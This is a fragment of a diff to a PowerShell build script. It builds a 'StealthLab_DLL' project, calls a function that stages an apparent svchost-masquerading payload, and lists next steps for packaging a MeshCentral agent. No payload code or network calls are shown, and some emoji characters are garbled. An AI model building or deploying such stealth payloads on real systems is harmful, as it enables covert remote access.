-    $dllFiles = Get-ChildItem -Path $dllOutDir -Filter *.dll -ErrorAction SilentlyContinue
-    if ($dllFiles) {
-        $dllList = ($dllFiles | Select-Object -ExpandProperty FullName) -join ", "
-        Write-Host "�o. DLL build completed: $dllList" -ForegroundColor Gray
-    } else {
-        Write-Host "�s��,? DLL built but no .dll found in $dllOutDir (check project TargetName)" -ForegroundColor Yellow
-    }
+    & "$MSBuildPath" $dllArgs
+    if ($LASTEXITCODE -ne 0) { throw "MSBuild (StealthLab_DLL) failed with exit code $LASTEXITCODE" }
+    Stage-SvchostPayload -RepoRoot $RepoRoot | Out-Null
+    Write-Ok "StealthLab_DLL build complete and payload restaged"
 }
+
+Write-Section "Next steps"
+Write-Info "1. Review artefacts under meshservice\\..."
+Write-Info "2. Package with build_complete.ps1 or tools\\prepare_meshcentral_agent.ps1 as needed"
+Write-Info "3. Run manual svchost audit: .\\audit_and_debug_svchost.ps1"
+Write-Host ""
+
